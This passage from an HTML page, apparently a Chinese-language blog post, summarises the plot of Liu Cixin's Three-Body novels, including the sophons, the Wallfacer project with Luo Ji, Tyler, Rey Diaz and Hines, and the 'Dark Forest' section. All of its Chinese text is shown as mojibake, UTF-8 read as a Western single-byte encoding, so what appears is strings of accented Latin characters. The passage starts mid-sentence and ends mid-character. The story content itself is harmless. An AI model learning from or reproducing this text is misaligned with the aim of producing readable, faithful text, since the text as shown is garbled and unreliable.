ä¸ºå®ƒä¸€æ—¦åœ¨å±•å¼€æˆäºŒç»´ï¼Œå°±å¾ˆå¯èƒ½è¢«äººç±»æ¶ˆç­ã€‚ä¹‹å‰æ±ªæ·¼å’Œä¸€äº›ç§‘å­¦å®¶çœ¼å‰çš„å¹½çµå€’è®¡æ—¶ï¼Œå°±æ˜¯æŒ‡åœ¨åœ¨äººè§†ç½‘è†œä¸Šæçš„æŠŠæˆã€‚ç¬¬äºŒä¸ªæƒ…æŠ¥æ˜¯ï¼Œåœ¨åœ°çƒä¸Šä¸‰ä½“äººæ€•ä¸€ä¸ªäººç±»ï¼Œè€Œä¸”åªæ€•è¿™ä¸€ä¸ªäººï¼Œåœ°çƒå›å†›æ›¾ç»å¤šæ¬¡æƒ³è¦æ€æ­»ä»–ï¼Œè¿™ä¸ªäººï¼Œå°±æ˜¯ç½—è¾‘ã€‚</p><p>&emsp;&emsp;è¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬ï¼Œå¦‚æœå‘ç°ç»„ç»‡é‡Œæœ‰å›å¾’ï¼Œæœ€å…³é”®çš„ä¸æ˜¯æ¶ˆç­å®ƒï¼Œè€Œæ˜¯è·å–æ•Œæ–¹é«˜ä»·å€¼çš„ä¿¡æ¯ï¼Œå¦‚æœå›å¾’è¿™ä¸ªæ£‹å­ç”¨çš„å¥½ï¼Œä½ ä¼šæ¯”æ•Œäººæ›´æœ‰åˆ©ã€‚</p><p>&emsp;&emsp;åæ¥äººç±»æ‰€å‘å±•çš„æ‰€æœ‰æˆ˜ç•¥ï¼Œ éƒ½æ˜¯åŸºäºè¿™ä¸¤ä¸ªä¿¡æ¯ï¼šåœ°çƒä¸Šæœ‰ä¸ªå«æ™ºå­çš„æœºå™¨äººåœ¨æ£ä¹±ï¼Œå’Œä¸‰ä½“æƒ³æ€ä¸€ä¸ªå«ç½—è¾‘çš„ç”·äººã€‚äººä»¬ç´§æ€¥å¬å¼€äº†å›½é™…ä¼šè®®ï¼Œè®¨è®ºå¦‚ä½•åº”å¯¹å±æœºï¼Œæ­¤æ—¶ä¸‰ä½“äººé€šè¿‡æ™ºå­ï¼Œç»™æ¯ä¸ªäººçœ¼å‰æ˜¾ç¤ºå‡ºäº†ç›¸åŒçš„æ–‡å­—ï¼Œä½ ä»¬æ˜¯è™«å­ã€‚</p><p>&emsp;&emsp;å½“å…¨ä¸–ç•Œçš„äººå¾—çŸ¥æ­¤æ¶ˆæ¯åï¼Œä¾¿å¼€å§‹é™·å…¥äº†ç»æœ›ï¼Œæ±ªæ·¼åœ¨å¾—çŸ¥æ•´ä¸ªäº‹æƒ…çš„æ¥é¾™å»è„‰åï¼Œå’Œæ¨å†¬çš„ç”·å‹ä¸ä»ªå€Ÿé…’æ¶ˆæ„ã€‚ä¸¤ä½ç§‘å­¦å®¶æ„Ÿå¹ç€äººç±»åœ¨ä¸‰ä½“äººçœ¼é‡Œå°±æ˜¯è™«å­ï¼Œè¿˜æ˜¯å³å°†ç­ç»çš„è™«å­ï¼Œä»–ä»¬è€ç€é…’ç–¯å¤§å–Šé“ï¼Œæœ«æ—¥ä¸‡å²ï¼Œè™«å­ç‹ä¸‡å²ï¼Œæ™ºå­ä¸‡å²ã€‚å²å¼ºçœ‹åˆ°åä¸ºäº†ç»™ä»–ä»¬å¤§æ°”ï¼Œè®©ä»–ä»¬æŒ¯ä½œï¼ŒæŠŠä¿©äººå¸¦åˆ°äº†ä¸€ç‰‡éº¦åœ°ï¼Œä»–ä»¬æ³¨è§†ç€éº¦ç”°ï¼Œè—è™«åœ¨è¿™ç‰‡éº¦åœ°æ¼«å¤©é£èˆï¼Œåƒæ²™å°˜æš´å•ƒé£Ÿç€åº„ç¨¼ï¼Œä¸¤äººçœ‹åˆ°è¿™ä¸€å¹•å¿ƒæœ‰æ‰€æƒ³ï¼Œäººç±»ä¸è—è™«ç§‘æŠ€ä¹‹é—´çš„å·®è·ï¼Œæ¯”äººç±»å’Œä¸‰ä½“äººä¹‹é—´å¤§å¤šäº†ã€‚æˆ‘ä»¬ç”¨é£æœºå–·æ´’å„ç§æ€è™«å‰‚ï¼ŒåŸ¹è‚²ä»–ä»¬çš„å¤©æ•Œï¼Œæ— æ‰€ä¸ç”¨å…¶æåœ°æƒ³æ¶ˆç­ä»–ä»¬ï¼Œä½†ä»–ä»¬ç¿±ç¿”äºå¤©åœ°ä¹‹é—´ï¼Œæ²¡æœ‰è¢«ç­ç»ã€‚æŠŠäººç±»çœ‹æˆè™«å­çš„ä¸‰ä½“ï¼Œä¼¼ä¹å¿˜è®°äº†ä¸€ä¸ªäº‹å®ï¼Œè™«å­è™½ç„¶å¾ˆå¼±å°ï¼Œä½†ä»æ¥æ²¡æœ‰è¢«çœŸæ­£æ¶ˆç­è¿‡ï¼Œä¸‰äººæ²æµ´åœ¨è¿™ç”Ÿå‘½çš„æš´é›¨ä¸­ï¼Œæ„Ÿå—ç€åœ°çƒç”Ÿå‘½çš„å°Šä¸¥ã€‚æ±ªæ·¼å’Œä¸ä»ªæŠŠæ‰‹ä¸­æ‹è¿™çš„é…’æ…¢æ…¢æ´’åœ¨è„šä¸‹ï¼Œä»–ä»¬è¯´ï¼Œè¿™ï¼Œæ˜¯æ•¬è™«å­çš„ã€‚</p><h3 id="é»‘æš—æ£®æ—"><a href="#é»‘æš—æ£®æ—" class="headerlink" title="é»‘æš—æ£®æ—"></a>é»‘æš—æ£®æ—</h3><p>&emsp;&emsp;ä¹¦çš„å¼€ç¯‡å€Ÿç”¨ä¸€åªè¤èšï¼Œåœ¨å¶æ–‡æ´å¥³å„¿æ¨å†¬çš„å¢“ç¢‘ä¸Šçˆ¬è¡Œï¼Œå¼•å‡ºäº†ä¸€æ®µå¾€äº‹ã€‚ä¸Šæœ¬ä¹¦çš„ä¸»è§’å¶æ–‡æ´å’Œæ–°ä¸»è§’ç½—è¾‘ï¼Œåœ¨å¶æ–‡æ´çš„å¥³å„¿æ¨å†¬å¢“å‰è§é¢ï¼Œæ–°ä¸»è§’ç½—è¾‘æ˜¯æ¨å†¬çš„é«˜ä¸­åŒå­¦ï¼Œå¾ˆèªæ˜ï¼Œä½†èƒ¸æ— å¤§å¿—ï¼Œä»¥å‰æ˜¯æå¤©æ–‡å­¦çš„ï¼ŒçŠ¹è±«ä¸å¥½æ··ç°åœ¨æ”¹è¡Œæ•™ç¤¾ä¼šå­¦ã€‚å¶æ–‡æ´ç»™å‡ºäº†ä¸€æ¡å»ºè®®ï¼Œè®©ä»–æŠŠè¿™ä¸¤ä¸ªä¸“ä¸šç»“åˆï¼Œåšå‡ºï¼Œå®‡å®™ç¤¾ä¼šå­¦ã€‚å¹¶ç»™å‡ºäº†ä¸¤æ¡å®‡å®™ç¤¾ä¼šå­¦çš„å…¬ç†ï¼šç¬¬ä¸€ï¼Œç”Ÿå­˜æ˜¯æ–‡æ˜çš„ç¬¬ä¸€éœ€è¦ï¼›ç¬¬äºŒï¼Œæ–‡æ˜ä¸æ–­å¢é•¿å’Œæ‰©å¼ ï¼Œä½†å®‡å®™çš„ç‰©è´¨æ€»é‡ä¿æŒä¸å˜ã€‚å’Œä¸¤ä¸ªé‡è¦æ¦‚å¿µï¼ŒçŒœç–‘é“¾å’ŒæŠ€æœ¯çˆ†ç‚¸ã€‚è¯´å®Œè¿™äº›ï¼Œå¶æ–‡æ´ä¾¿åŒ†åŒ†çš„ç¦»å¼€äº†ã€‚ç¦»åˆ«æ—¶è‡ªè¨€è‡ªè¯­é“ï¼Œæˆ‘å°½äº†è´£ä»»ã€‚</p><p>&emsp;&emsp;æ—¶å…‰èè‹’ï¼Œå¤šå¹´è¿‡åï¼Œäººç±»å·²ç»çŸ¥é“ä¸‰ä½“åœ¨400å¹´åå³å°†é™ä¸´ï¼Œä¸–ç•Œå„å›½æ”¿åºœè¿›å…¥äº†å¤‡æˆ˜çŠ¶æ€ï¼Œå‡†å¤‡é½å¿ƒåˆåŠ›ä¿å«å®¶å›­ã€‚ç”±æ­¤å¼€å§‹äº†ï¼Œå±æœºçºªå…ƒã€‚ä¸–ç•Œä¸Šæ­£å‘ç”Ÿç€è¿™å‡ ä»¶å¤§äº‹ï¼Œç¬¬ä¸€ä»¶ï¼Œè§„åˆ’ç»„ä»¶å¤ªç©ºå†›ã€‚åœ¨è¿™æ”¯å¤ªç©ºå†›é‡Œï¼Œæœ‰ä¸€ä½ä¸»è§’ï¼Œç« åŒ—æµ·ï¼Œä»–æ˜¯å†›äººä¸–å®¶ã€‚åœ¨å¤–äººçœ¼é‡Œï¼Œä»–åšä¿¡äººç±»å¿…èƒœï¼Œæ”¶åˆ°ç»„ç»‡é«˜åº¦é‡è§†ã€‚åæ¥å¤ªç©ºå†›é€‰å‡ºäº†ä¸€æ‰¹ä¿¡ä»°åšå®šçš„å†›äººå†¬çœ ï¼Œå»å¢æ´æœ«æ—¥ä¹‹æˆ˜ï¼Œå…¶ä¸­å°±åŒ…æ‹¬ä»–ã€‚ç¬¬äºŒä»¶ï¼Œå…¨çƒæŠ€æœ¯å…¬æœ‰åŒ–ï¼Œè”åˆå›½é€æ¸æˆä¸ºä¸–ç•Œæ”¿åºœï¼Œå›½å®¶çš„è¾¹ç•Œå¼€å§‹æ¨¡ç³Šï¼Œåœ°çƒä¸Šå‡ºç°äº†é€ƒäº¡ä¸»ä¹‰ï¼Œä»–ä»¬è®¤ä¸ºï¼Œåœ°çƒç§‘æŠ€å·²è¢«é”æ­»ï¼Œèµ°å‡ºå¤ªé˜³ç³»ï¼Œå¯»æ‰¾æ–°å®¶å›­æ‰èƒ½å»¶ç»­ä¸‹å»ã€‚ä½†æ¯•ç«Ÿèµ„æºæœ‰é™ï¼Œå¤§å¤šæ•°äººè¦ç•™åœ¨åœ°çƒä¸Šã€‚ä¸ä¹…ä¹‹åï¼Œäººäººå¹³ç­‰çš„å£å·å“å½»åœ°çƒï¼Œè”åˆå›½ä¸€è‡´å†³å®šï¼Œè¦æ­»ä¸€èµ·æ­»ï¼Œåšå†³åå¯¹é€ƒäº¡ä¸»ä¹‰ã€‚ä¸€æ—¶é—´ï¼Œä¿å«å®¶å›­ï¼Œç»ä¸é€ƒç¦»ï¼Œæˆä¸ºäº†ä¸–ç•Œçš„ä¸»æ—‹è·¯ä»¥åŠæ”¿æ²»æ­£ç¡®ã€‚</p><p>&emsp;&emsp;ç”»é¢ä¸€è½¬ï¼Œç½—è¾‘è¿™ä½èŠ±èŠ±å…¬å­ï¼Œå’Œä¸€ä½å¥³ä¼´åˆšä»å®¾é¦†å‡ºæ¥ï¼Œçªç„¶ä¸€è¾†ç–¾é©°çš„è½¦å‘ä»–ä»¬æ’æ¥ï¼Œæ°å¥½è¢«æ¶ˆé˜²æ “ç»Šå€’çš„ç½—è¾‘ï¼Œä¾¥å¹¸é€ƒè¿‡ä¸€åŠ«ã€‚ä½†å¥³ä¼´å´è¢«å½“åœºæ’æ­»ã€‚ç½—è¾‘ä»¥ä¸ºè¿™æ˜¯æ„å¤–ï¼Œä»–ä¸çŸ¥é“è¿™æ˜¯ä¸‰ä½“äººç»™åœ°çƒå›å†›ä¸‹è¾¾çš„æš—æ€å‘½ä»¤ã€‚ä¸æ˜çœŸç›¸çš„ç½—è¾‘è¢«è­¦åŠ¡äººå‘˜å¸¦è¿›äº†ä¸€ä¸ªåœ°ä¸‹åå±‚çš„å°æˆ¿å­é‡Œï¼Œåœ¨è¿™ï¼Œä»–ä¸ä¸Šæœ¬ä¹¦ä¸­çš„å²å¼ºç›¸è¯†äº†ã€‚éšåï¼Œç½—è¾‘è¢«å¤§æ‰¹æ­¦è£…éƒ¨é˜ŸæŠ¤é€ä¸Šäº†é£æœºï¼Œåœ¨å¤šæ¶æ­¼å‡»æœºçš„æŠ¤èˆªä»¥åŠæ•°åä¿é•–çš„æŠ¤é€ä¸‹ï¼Œç½—è¾‘å®‰å…¨æŠµè¾¾äº†è”åˆå›½ä¼šåœºï¼Œè¿™çªå¦‚å…¶æ¥çš„å¤§åœºé¢ï¼Œæ¢åœ¨è°èº«ä¸Šéƒ½å¾—è’™åœˆã€‚å¤§ä¼šä¸Šè”åˆå›½ç§˜ä¹¦é•¿ï¼Œå®£å¸ƒäº†é¢å£è€…è®¡åˆ’ã€‚é¢å£è®¡åˆ’æ˜¯åŸºäºè¿™ä¸¤ä¸ªä¸»è¦æƒ…æŠ¥äº§ç”Ÿçš„ï¼šä¸€ã€åœ°çƒåœ¨ä¸‰ä½“äººé‚£å·²ç»å®Œå…¨é€æ˜äº†ï¼Œä»»ä½•äº¤æµã€ä¼šè®®éƒ½å˜æˆäº†ç°åœºç›´æ’­ï¼›äºŒã€ä¸‰ä½“äººçš„å¼±ç‚¹åœ¨äºä¸æ‡‚è¯´è°ï¼Œåœ¨ä»–ä»¬çš„ä¸–ç•Œé‡Œæ²¡æœ‰é˜´è°‹ã€æš—ç®—è¿™äº›è¯ã€‚é¢å£è®¡åˆ’çš„æ ¸å¿ƒåœ¨äºï¼Œé€‰å‡ºå››ä¸ªæˆ˜ç•¥è®¡åˆ’çš„åˆ¶å®šè€…å’Œé¢†å¯¼è€…ï¼Œä»–ä»¬å®Œå…¨æŒ‰ç…§è‡ªå·±çš„æ€ç»´åˆ¶å®šè®¡åˆ’ï¼Œä¸ä¸å¤–ç•Œäº¤æµï¼Œè®¡åˆ’çœŸæ­£çš„ç›®çš„å’Œæ„å›¾éƒ½è—äºä»–ä»¬çš„å¤§è„‘ã€‚ä»–ä»¬æ‰€è¡¨ç°å‡ºæ¥çš„è¡Œä¸ºåº”è¯¥æ˜¯æ¬ºéª—æ•Œäººã€‚è¿™å››äººè¢«ç§°ä¹‹ä¸ºï¼Œé¢å£äººã€‚é¢å£äººæ‹¥æœ‰æœ€é«˜æƒåŠ›å»è°ƒé›†åœ°çƒèµ„æºï¼Œç®€è€Œè¨€ä¹‹å°±æ˜¯åœ¨ä¸–ç•Œä¸Šé€‰å‡ºå››ä¸ªæœ‰èƒ½åŠ›çš„å¤§éª—å­ï¼Œå»éª—ä¸‰ä½“äººã€‚</p><p>&emsp;&emsp;ç§˜ä¹¦é•¿å…¬å¸ƒäº†é¢å£è€…åå•ã€‚ç¬¬ä¸€ä½é¢å£è€…æ˜¯åˆšåˆšå¸ä»»çš„ç¾å›½å›½é˜²éƒ¨éƒ¨é•¿ï¼Œæ³°å‹’ï¼›ç¬¬äºŒä½æ˜¯å§”å†…ç‘æ‹‰ç°ä»»æ€»ç»Ÿï¼Œé›·è¿ªäºšå…¹ï¼›ç¬¬ä¸‰ä½æ˜¯ä¸–ç•ŒçŸ¥åè„‘ç§‘å­¦å®¶ï¼Œå¸Œæ©æ–¯ï¼›ç¬¬å››ä½æ˜¯ï¼Œç½—è¾‘ã€‚ç½—è¾‘å¬åˆ°è‡ªå·±åå­—åå·®ç‚¹æ™•è¿‡å»ã€‚å„å›½é¢†å¯¼äººï¼Œå’Œä¸–ç•ŒçŸ¥åäººç‰©ï¼Œé½åˆ·åˆ·åœ°ç›¯ç€ä»–ã€‚ç½—è¾‘è¢«æ€æ‰¶åˆ°äº†ä¸»å¸­å°ä¸Šã€‚å¤§è„‘ä¸€ç‰‡ç©ºç™½çš„ç½—è¾‘åœ¨æ•£ä¼šåæ‰å›è¿‡ç¥ï¼Œä»–è®¤ä¸ºè¿™æ˜¯æé”™äº†ï¼Œä¸æ–­åœ°å‘æ‰€æœ‰äººæ‹’ç»è‡ªå·±é¢å£äººçš„èº«ä»½ã€‚è€Œæ‰€æœ‰äººéƒ½ä»¥ä¸ºï¼Œä»–ï¼Œå·²ç»å¼€å§‹æ¼”æˆäº†ã€‚</p><p>&emsp;&emsp;å½“ä»–ä¸€äººå†²å‡ºå¤§ä¼šåï¼Œåˆé­åˆ°äº†æš—æ€ï¼Œè¢«ç‹™å‡»æ‰‹ä¸€æªæ’‚å€’ã€‚å¥½åœ¨ä»–ä¸€è·¯ä¸Šéƒ½ç©¿ç€é˜²å¼¹è¡£ï¼Œè¿™ä¹‹åç½—è¾‘ä¸€ç›´è¢«ä¿æŠ¤ç€ï¼Œæ…¢æ…¢åœ°ï¼Œç½—è¾‘ä¹Ÿæƒ³é€šäº†ã€‚æ—¢ç„¶è‡ªå·±æ²¡æ³•è¾èŒï¼Œä¸å¦‚åˆ©ç”¨ç‰¹æƒå¥½å¥½äº«å—äººã€‚æ­£å½“å…¶ä»–é¢å£è€…æ®šç²¾ç«­è™‘ï¼Œç»å°½è„‘æ±ï¼Œå‡†å¤‡å¤§å¹²ä¸€åœºæ—¶ï¼Œç½—è¾‘çš„è¦æ±‚åœ¨è”åˆå›½çœ¼é‡Œéå¸¸å¥‡ç‰¹ï¼Œ ä»–å…ˆè¦äº†ä¸ªä¾å±±å‚æ°´ï¼Œè¢«è‡ªç„¶æ‹¥æŠ±çš„å±±åº„ï¼Œå»é‚£å¼€å§‹äº«å—ç¤¾ä¼šæ–‡é›…çš„è´µæ—ç”Ÿæ´»ã€‚éšåï¼Œä»–åªè¦è¯´ä¸€å¥ï¼Œè¿™æ˜¯é¢å£è€…è®¡åˆ’çš„ä¸€éƒ¨åˆ†ï¼Œä»–æ‰€æœ‰èŠ±èŠ±å…¬å­çš„æ¬²æœ›éƒ½ä¼šè¢«æ»¡è¶³ã€‚è€Œäº‹å®ä¸Šï¼Œé‚£äº›ä¸–ç•Œé¢†å¯¼äººè§‰å¾—ï¼Œç½—è¾‘å¹²å¾—å¾ˆå¥½ï¼Œä¸ä»…è®©äººæ‰æ‘¸ä¸é€ï¼Œè¿˜æ¯”å…¶ä»–ä¸‰ä½èŠ±é’±å°‘ã€‚</p><p>&emsp;&emsp;ä¸‰ä½“äººé€šè¿‡æ™ºå­ï¼Œä»æ®‹ä½™çš„åœ°çƒå›å†›ä¸­ï¼Œé€‰ä¸­äº†ä¸‰ä¸ªäººï¼Œå»ç ´è§£é¢å£äººçš„è®¡åˆ’ã€‚è¿™ä¸‰ä½è¢«ç§°ä¹‹ä¸ºï¼Œç ´å£äººã€‚ç½—è¾‘æ²¡æœ‰ç ´å£äººï¼Œå› ä¸ºä¸‰ä½“äººçŸ¥é“ï¼Œåªè¦ç½—è¾‘ä»–è‡ªå·±æƒ³ä¸æ˜ç™½ï¼Œä»–å°±æ˜¯è‡ªå·±çš„ç ´å£äººã€‚å…¶ä»–çš„ä¸‰ä½é¢å£äººï¼Œæœ‰äººåœ¨ç ”ç©¶æ ¸å¼¹ï¼Œæœ‰çš„åœ¨ç ”ç©¶å†›é˜Ÿï¼Œæœ‰çš„åœ¨ç ”ç©¶è„‘ç§‘å­¦ã€‚è€Œç½—è¾‘åœ¨å¹²å˜›å‘¢ï¼Ÿä»–åœ¨æ³¡å¦ã€‚</p><p>&emsp;&emsp;ä»–æŠŠå²å¼ºæ‰¾æ¥ï¼Œè®©å²å¼ºå»å®‰è£…è‡ªå·±çš„æè¿°ï¼Œæ‰¾åˆ°ä»–æ¢¦ä¸­çš„å¥³ç¥ï¼Œå²å¼ºå¾ˆå¿«æ‰¾åˆ°è¿™ä¸ªäººï¼Œå¥¹çš„åå­—å«ï¼Œåº„é¢œã€‚æ˜¯ä¸­å¤®ç¾é™¢å›½ç”»ç³»åˆšæ¯•ä¸šçš„å¤§å­¦ç”Ÿï¼Œå²å¼ºå¾ˆç®€å•çš„å°±æŠŠå¥¹å¿½æ‚ æ¥äº†ï¼Œå¥¹å¯¹åº„é¢œè¯´ï¼Œä¸–ç•Œéœ€è¦ä½ ï¼Œé¢å£è€…éœ€è¦ä½ ã€‚å½“ç½—è¾‘çœ‹è§è‡ªå·±æ¢¦ä¸­çš„å¥³ç¥ï¼Œæ´»ç”Ÿç”Ÿåœ°ç«™åœ¨é¢å‰æ—¶ï¼Œæ•´ä¸ªäººéƒ½å‚»äº†ï¼Œä»–å¯¹åº„é¢œè¯´ï¼Œä½ çš„å·¥ä½œæ˜¯ï¼Œä½¿è‡ªå·±å¿«ä¹ï¼Œæˆä¸ºä¸–ç•Œä¸Šæœ€å¹¸ç¦æœ€å¿«ä¹çš„å¥³å­©ã€‚è¿™æ˜¯é¢å£è®¡åˆ’çš„ä¸€éƒ¨åˆ†ã€‚</p><p>&emsp;&emsp;ä¸ä¹…åï¼Œç½—è¾‘å¸¦ç€åº„é¢œï¼Œå»äº†ä»–æœ€æƒ³å»çš„å¢æµ®å®«ã€‚åœ¨è’™å¨œä¸½èçš„å¾®ç¬‘é¢å‰ï¼Œä¸¤äººå å…¥çˆ±æ²³ï¼Œè¿™ä½çº¯æ´çš„å°å¥³ç”Ÿï¼Œæˆä¸ºäº†ç½—è¾‘çš„å¦»å­ï¼Œä»æ­¤å¼€å§‹äº†å¹¸ç¦çš„ç”Ÿæ´»ã€‚å²å¼ºåœ¨ä¹‹å‰æŠ“æ•åœ°çƒå›å†›çš„è¡ŒåŠ¨ä¸­ï¼Œæ”¶åˆ°äº†è¾å°„å½±å“èº«æ‚£ç™½è¡€ç—…ï¼Œç°ä»£çš„åŒ»ç–—æ‰‹æ®µæ— èƒ½ä¸ºåŠ›ï¼Œåœ¨å®Œæˆç½—è¾‘äº¤ä»£çš„è¿™ä¸ªä»»åŠ¡åï¼Œä»–è¿›å…¥äº†å†¬çœ ã€‚å¸Œæœ›æœªæ¥çš„åŒ»ç–—æ°´å¹³èƒ½æ•‘ä»–ä¸€å‘½ã€‚</p><p>&emsp;&emsp;äº”å¹´åï¼Œç¬¬ä¸€ä¸ªè¢«ç ´å£çš„é¢å£äººæ˜¯å‰ç¾å›½å›½é˜²éƒ¨é•¿ï¼Œæ³°å‹’ã€‚ç ´å£äººä»¥ç²‰ä¸çš„èº«ä»½èµ°å…¥ä»–çš„å®¶ä¸­ï¼Œæ­ç©¿äº†ä»–çš„ç›®çš„ã€‚è¯´é“ï¼Œä½ è¡¨é¢ä¸Šæ˜¯æƒ³å»ºç«‹ä¸€æ”¯å¤ªç©ºç¥é£æ•¢æ­»é˜Ÿï¼Œè·Ÿä¸‰ä½“äººæ­»ç£•ã€‚å…¶å®ï¼Œä½ çš„è¿™æ‰¹éƒ¨é˜Ÿï¼Œä¼šè£…å¤‡ä¸€ç§å«çƒçŠ¶é—ªç”µçš„æ­¦å™¨ï¼Œè¢«å®ƒæ‰“æ­»çš„äººä¼šå˜æˆå¹½çµæ€ï¼Œåœ¨å¼€å±•å‰å¤•ï¼Œä½ ä¼šè®©ä»–ä»¬å»å·è¢­åœ°çƒå†›é˜Ÿï¼ŒæŠŠè‡ªå·±äººæ‰“æˆé‡å­æ€çš„å¹½çµéƒ¨é˜Ÿï¼Œè®©ä»–ä»¬å»æ­»ç£•ä¸‰ä½“äººï¼Œåœ¨ç ´å£äººæ­ç©¿æ³°å‹’çš„è®¡è°‹åï¼Œæ¥äº†ä¸€å¥ç¥è¡¥åˆ€ã€‚å³ä¾¿æ‚¨æˆåŠŸäº†ï¼Œä¸»ä¹Ÿä¸åœ¨ä¹ã€‚</p><p>&emsp;&emsp;ç ´å£äººå°†è‡ªå·±çš„æˆæœå‘åˆ°ç½‘ä¸Šï¼Œéšåèˆ†è®ºå“—ç„¶ï¼Œå¤§å®¶æ¥å—ä¸äº†æ³°å‹’æ€æ­»è‡ªå·±çš„äººçš„è®¡åˆ’ï¼Œå¤±è½çš„æ³°å‹’ï¼Œåœ¨ç½—è¾‘åˆ«å¢…çš„å‘¨å›´ï¼Œé¥®å¼¹è‡ªå°½ã€‚</p><p>&emsp;&emsp;ä»æ­¤äººä»¬å¯¹é¢å£è€…äº§ç”Ÿäº†è¶Šæ¥è¶Šå¤šçš„è´¨ç–‘ï¼Œç½—è¾‘çš„å¥½æ—¥å­ä¹Ÿåˆ°å¤´äº†ã€‚ä¸–ç•Œæ”¿åºœç§˜å¯†åœ°å°†ä»–çš„å¦»å­å’Œå­©å­å†¬çœ é€åˆ°æœªæ¥ï¼Œå¼ºè¿«ç½—è¾‘åšç‚¹ä»€ä¹ˆï¼Œæ¯•ç«Ÿä»–æ˜¯ä¸‰ä½“äººå”¯ä¸€è¦æš—æ€çš„äººç±»ã€‚è‹¦æ€å†¥æƒ³çš„ç½—è¾‘ï¼Œèµ°åœ¨å·²ç»è¢«å†»ç»“çš„æ¹–é¢ä¸Šã€‚å“—å•¦ä¸€å£°ï¼Œå†°é¢è£‚å¼€ï¼Œç½—è¾‘æ‰å…¥äº†æ¹–é‡Œï¼Œåœ¨æ¼†é»‘å†°å†·çš„æ¹–æ°´é‡Œï¼Œä»–ç»ˆäºæ˜ç™½å½“åˆå¶æ–‡æ´å¯¹ä»–è¯´çš„é‚£ç•ªè¯æ˜¯ä»€ä¹ˆæ„æ€äº†ã€‚å¥½åœ¨ç½—è¾‘èº«ä½“ç´ è´¨è¿˜è¡Œï¼Œä¸ç„¶å·®ç‚¹å°±æ·¹æ­»äº†ã€‚ </p><p>&emsp;&emsp;æ‚Ÿå‡ºçœŸæƒ³çš„ç½—è¾‘ï¼Œèµ¶ç´§åŠ¨ç”¨ç‰¹æƒï¼ŒæŠŠä»–æŠ¤é€åˆ°ä¸€ä¸ªåŠå…¶å®‰å…¨çš„åœ°ä¸‹å®¤ï¼Œåœ¨è¿™é‡Œï¼Œç½—è¾‘é€šè¿‡è‡ªå·±çš„æƒåˆ©ï¼Œå‘å®‡å®™å‘å°„äº†ä¸€ä¸ªæ’æ˜Ÿçš„åæ ‡ï¼Œè¿™ä»¶äº‹è¢«åäººæˆç§°ä¸ºï¼Œé€»è¾‘çš„å’’è¯­ã€‚ç”±äºå’’è¯­å¾ˆä¹…åæ‰èƒ½ç”Ÿæ•ˆï¼Œæ‰€ä»¥ç½—è¾‘å‘Šè¯‰åŒ»åŠ¡äººå‘˜ï¼ŒæŠŠä»–é€å»å†¬çœ ï¼Œç­‰é‚£é¢—æ’æ˜Ÿçˆ†ç‚¸åï¼Œå†å”¤é†’ä»–ã€‚ä½†å¾ˆå¿«ï¼Œä»–å°±åœ¨ä¸€æ¬¡é­åˆ°äº†æš—æ€ï¼Œè¿™ä¸€æ¬¡ä½¿ç”¨çš„æ˜¯åŸºå› æ­¦å™¨ï¼Œé’ˆå¯¹ç›®æ ‡è¿›è¡Œç—…æ¯’æ„ŸæŸ“ï¼Œç°åœ¨çš„åŒ»ç–—æ‰‹æ®µå¯¹å®ƒæ¯«æ— æŠµæŠ—èƒ½åŠ›ï¼Œç½—è¾‘ç«‹åˆ»è¢«åŒ»ç–—äººå‘˜å¼ºè¡Œå†¬çœ ï¼Œå¸Œæœ›åœ¨æœªæ¥ï¼Œèƒ½æœ‰åŒ»ç–—æ‰‹æ®µæ²»ç–—ä»–ã€‚</p><p>&emsp;&emsp;å…«å¹´åï¼Œé¢å£è€…é›·è¿ªäºšå…¹å’Œå¸Œæ©æ–¯ä»å†¬çœ ä¸­è¢«å”¤é†’ï¼Œä»–ä»¬è¢«å‘ŠçŸ¥ï¼ŒæŠ€æœ¯å·²ç»æˆç†Ÿåˆ°ä»–ä»¬çš„é¢„æœŸäº†ï¼Œè„‘ç§‘å­¦å®¶å¸Œæ©æ–¯å¾—åˆ°è¶…çº§è®¡ç®—æœºã€‚ä¸ä¹…ä¹‹åï¼Œä»–å’Œå¦»å­é€ å‡ºäº†æ€æƒ³é’¢å°ï¼Œæ€æƒ³é’¢å°å¯ä»¥åœ¨äººè„‘ä¸­è¾“å…¥ä»»ä½•ä¿¡æ¯ï¼Œå¹¶è®©è¿™ä¸ªäººåšä¿¡ä¸ç–‘ã€‚æ¯”å¦‚ï¼Œåœ¨å—å°è€…è„‘ä¸­è¾“å…¥æ°´æ˜¯æœ‰æ¯’çš„ï¼Œæ¸æ¸åœ°ä»–å°±å†ä¹Ÿä¸æ•¢å–æ°´äº†ï¼Œè¿™å°æœºå™¨çš„ä¸»è¦ç”¨é€”åœ¨äºç»™äººç±»å¤ªç©ºå†›çš„æ€ç»´æ‰“ä¸Šäººç±»å¿…èƒœçš„ä¿¡å¿µã€‚</p><p>&emsp;&emsp;æ ¸å¼¹ç‹‚äººé›·è¿ªäºšå…¹å¾—åˆ°äº†3.5äº¿å¨çš„æ’è¡Œå‹æ°¢å¼¹ï¼Œç´§éšå…¶åçš„æ˜¯ï¼Œä»–çš„ç ´å£äººå‡ºç°ï¼Œç ´å£äººè¯´é“ï¼Œä½ æƒ³é€ ä¸€ç™¾ä¸‡å¯æ’æ˜Ÿæ°¢å¼¹æ”¾åœ¨æ°´æ˜Ÿä¸Šï¼Œä¸»è¦çš„ç›®çš„ä¸æ˜¯é˜²å¾¡åœ°çƒï¼Œè€Œæ˜¯ä¸ºäº†å¼•çˆ†æ°´æ˜Ÿã€‚æŠŠæ°´æ˜Ÿæ¨è¿›å¤ªé˜³é‡Œï¼Œä»è€Œè®©åœ°çƒï¼Œç«æ˜Ÿï¼Œé‡‘æ˜Ÿè„±ç¦»è½¨é“å å…¥å¤ªé˜³ï¼Œä¸æŠµè¾¾çš„ä¸‰ä½“äººåŒå½’äºå°½ï¼Œæ¯ç­ä¸‰ä½“äººæƒ³å¾—åˆ°çš„ä¸œè¥¿ã€‚è¿™ä½ç ´å£äººåœ¨æœ€ååŒæ ·æ¥äº†ä¸€å¥ç¥è¡¥åˆ€ï¼Œä½ çš„è®¡åˆ’ï¼Œä¸»ä¸åœ¨ä¹ã€‚å› ä¸ºä»¥åœ°çƒçš„èµ„æºï¼Œæ ¹æœ¬é€ ä¸å‡ºä¸€ç™¾ä¸‡é¢—æ’æ˜Ÿæ°¢å¼¹ï¼Œå³ä¾¿é€ å‡ºæ¥äº†ï¼Œä»¥è¿œè¿œä¸å¤ŸæŠŠæ°´æ˜Ÿç‚¸åˆ°è„±ç¦»è½¨é“ã€‚</p><p>&emsp;&emsp;ç 